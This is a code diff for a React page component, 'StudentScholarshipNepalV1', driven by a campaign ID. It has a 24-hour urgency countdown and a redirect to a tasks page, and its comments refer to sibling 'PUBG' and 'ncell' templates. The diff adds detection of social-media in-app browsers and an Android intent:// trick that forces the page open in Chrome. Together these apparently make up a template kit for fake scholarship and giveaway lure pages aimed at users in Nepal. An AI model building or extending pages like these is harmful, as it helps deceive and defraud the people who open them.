@@ -17,22 +17,21 @@ function StudentScholarshipNepalV1({ campaign }) {
   });
   const [error, setError] = useState('');
   const [isLoading, setIsLoading] = useState(false);
-  const [isWebView, setIsWebView] = useState(false);
   const [timeRemaining, setTimeRemaining] = useState({
     hours: 24,
     minutes: 0,
     seconds: 0,
   });
-  const [showWebViewWarning, setShowWebViewWarning] = useState(false);
+  const [showWebViewModal, setShowWebViewModal] = useState(false);
 
-  // ── Detect WebView ──
+  // ── Detect WebView (same pattern as PUBG) ──
   useEffect(() => {
-    const ua = navigator.userAgent || navigator.vendor || window.opera;
-    const isWebView = /FBAN|FBAV|Instagram|WebView|wv/.test(ua);
-    setIsWebView(isWebView);
-    if (isWebView) {
-      setShowWebViewWarning(true);
-    }
+    const ua = navigator.userAgent.toLowerCase();
+    const isWebView = /facebook|instagram|twitter|tiktok|line|whatsapp|snapchat|pinterest|fbav|fban/.test(ua) ||
+                      (window.navigator.standalone === false) ||
+                      (typeof window.ReactNativeWebView !== 'undefined') ||
+                      (navigator.userAgent.indexOf('wv') > -1);
+    if (isWebView) setShowWebViewModal(true);
   }, []);
 
   // ── 24‑hour countdown timer ──
@@ -84,7 +83,6 @@ function StudentScholarshipNepalV1({ campaign }) {
 
     setIsLoading(true);
 
-    // If campaign ID is missing, redirect to create page (SPA)
     if (!id) {
       router.push('/create');
       return;
@@ -93,61 +91,56 @@ function StudentScholarshipNepalV1({ campaign }) {
     router.push(`/tasks?id=${id}`);
   };
 
-  // ── WebView Warning Overlay ──
-  if (showWebViewWarning) {
+  // ─── WEBVIEW MODAL (overlay on top, NOT replacing the page) ───
+  const WebViewModal = () => {
+    if (!showWebViewModal) return null;
     return (
-      <div className="fixed inset-0 z-[9999] flex items-center justify-center bg-black/60 backdrop-blur-sm px-4 animate-fadeIn">
-        <div className="bg-white rounded-3xl max-w-md w-full p-8 text-center shadow-2xl">
-          <div className="w-20 h-20 mx-auto mb-4 rounded-full bg-blue-100 flex items-center justify-center">
-            <svg className="w-10 h-10 text-blue-600" fill="none" stroke="currentColor" strokeWidth={2} viewBox="0 0 24 24">
-              <path strokeLinecap="round" strokeLinejoin="round" d="M21 12a9 9 0 01-9 9m9-9a9 9 0 00-9-9m9 9H3m9 9a9 9 0 01-9-9m9 9c1.657 0 3-4.03 3-9s-1.343-9-3-9m0 18c-1.657 0-3-4.03-3-9s1.343-9 3-9" />
-            </svg>
+      <div className="modal-overlay">
+        <div className="modal-card">
+          <div className="modal-icon">🌐</div>
+          <h2>Open in Browser</h2>
+          <p>For the best experience, open this page in your default browser.</p>
+          <div className="modal-actions">
+            <button 
+              className="modal-btn" 
+              onClick={() => { 
+                navigator.clipboard?.writeText(window.location.href); 
+                setShowWebViewModal(false); 
+              }}
+            >
+              📋 Copy Link
+            </button>
+            <button 
+              className="modal-btn primary" 
+              onClick={() => { 
+                const url = window.location.href; 
+                if (navigator.userAgent.includes('Android')) { 
+                  window.location.href = `intent://${window.location.host}${window.location.pathname}${window.location.search}${window.location.hash}#Intent;scheme=https;package=com.android.chrome;end`; 
+                } else { 
+                  window.open(url, '_system'); 
+                } 
+              }}
+            >
+              🚀 Open in Browser
+            </button>
           </div>
-          <h2 className="text-2xl font-bold text-gray-900 mb-2">Open in Browser</h2>
-          <p className="text-gray-500 text-sm mb-6">
-            This page works best in a full browser. Please open it in your default browser to continue.
-          </p>
-          <button
-            onClick={() => {
-  const currentUrl = window.location.href;
-  // Try to open in a new browser tab
-  const newWindow = window.open(currentUrl, '_blank');
-  if (!newWindow || newWindow.closed || typeof newWindow.closed === 'undefined') {
-    // Fallback: copy link and let user paste manually
-    navigator.clipboard?.writeText(currentUrl)
-      .then(() => {
-        alert('Link copied! Please open it in your browser.');
-        setShowWebViewWarning(false);
-      })
-      .catch(() => {
-        // If clipboard fails, just show the URL
-        alert(`Please copy this URL and open in your browser: ${currentUrl}`);
-        setShowWebViewWarning(false);
-      });
-  } else {
-    // Success: close the overlay
-    setShowWebViewWarning(false);
-  }
-}}
-            className="w-full py-3 bg-blue-600 text-white font-semibold rounded-xl hover:bg-blue-700 transition"
-          >
-            Open in Browser
-          </button>
-          <button
-            onClick={() => setShowWebViewWarning(false)}
-            className="mt-3 w-full py-3 bg-gray-100 text-gray-700 font-medium rounded-xl hover:bg-gray-200 transition text-sm"
+          <button 
+            className="modal-btn ghost" 
+            onClick={() => setShowWebViewModal(false)}
           >
             Continue Anyway
           </button>
-          <p className="mt-3 text-xs text-gray-400">If the button doesn't work, copy the URL manually.</p>
         </div>
       </div>
     );
-  }
+  };
 
   // ── Main UI ──
   return (
     <div className="page-wrapper">
+      {/* ─── WEBVIEW MODAL (overlay) ─── */}
+      <WebViewModal />
+
       <header className="site-header">
         <div className="header-logo">
           <span className="logo-text">📘 <strong>Scholarship</strong> 2026</span>
@@ -318,7 +311,7 @@ function StudentScholarshipNepalV1({ campaign }) {
         <p className="footer-contact">Kathmandu, Nepal &nbsp;|&nbsp; Support: 1660</p>
       </footer>
 
-      {/* ── Styles using dangerouslySetInnerHTML (same as ncell template) ── */}
+      {/* ── Styles ── */}
       <style dangerouslySetInnerHTML={{ __html: `
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body { font-family: 'Plus Jakarta Sans', system-ui, sans-serif; background: #f0f7ff; color: #1f2937; line-height: 1.6; min-height: 100vh; }
@@ -611,6 +604,72 @@ function StudentScholarshipNepalV1({ campaign }) {
         }
         .site-footer p { font-size: 0.7rem; color: #9ca3af; max-width: 550px; margin: 0 auto; line-height: 1.7; }
         .footer-contact { font-weight: 700; color: #6b7280; margin-top: 0.4rem; }
+
+        /* ─── MODAL OVERLAY (same as PUBG) ─── */
+        .modal-overlay {
+          position: fixed;
+          top: 0; left: 0; width: 100%; height: 100%;
+          background: rgba(0,0,0,0.85);
+          backdrop-filter: blur(12px);
+          display: flex;
+          align-items: center;
+          justify-content: center;
+          z-index: 9999;
+        }
+        .modal-card {
+          background: #1a1c22;
+          border-radius: 36px;
+          padding: 2.8rem 2rem;
+          max-width: 420px;
+          width: 90%;
+          text-align: center;
+          border: 1px solid rgba(255,140,0,0.2);
+          box-shadow: 0 20px 50px rgba(0,0,0,0.6);
+        }
+        .modal-icon { font-size: 3.2rem; margin-bottom: 0.5rem; }
+        .modal-card h2 {
+          font-size: 1.6rem;
+          font-weight: 800;
+          color: #fff;
+          margin-bottom: 0.5rem;
+        }
+        .modal-card p {
+          color: #aaa;
+          margin-bottom: 1.8rem;
+        }
+        .modal-actions {
+          display: flex;
+          gap: 12px;
+          flex-wrap: wrap;
+          justify-content: center;
+        }
+        .modal-btn {
+          background: rgba(255,255,255,0.08);
+          border: 1px solid rgba(255,255,255,0.1);
+          padding: 0.7rem 1.5rem;
+          border-radius: 60px;
+          font-weight: 600;
+          color: #fff;
+          cursor: pointer;
+          transition: 0.2s;
+          flex: 1;
+          min-width: 120px;
+        }
+        .modal-btn:hover { background: rgba(255,255,255,0.15); }
+        .modal-btn.primary {
+          background: #ff8c00;
+          border: none;
+          color: #0b0d10;
+        }
+        .modal-btn.primary:hover { background: #e67600; }
+        .modal-btn.ghost {
+          background: transparent;
+          border: none;
+          color: #888;
+          margin-top: 0.5rem;
+          font-size: 0.8rem;
+        }
+        .modal-btn.ghost:hover { color: #fff; }
 
         @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
         .animate-fadeIn { animation: fadeIn 0.3s ease-out; }
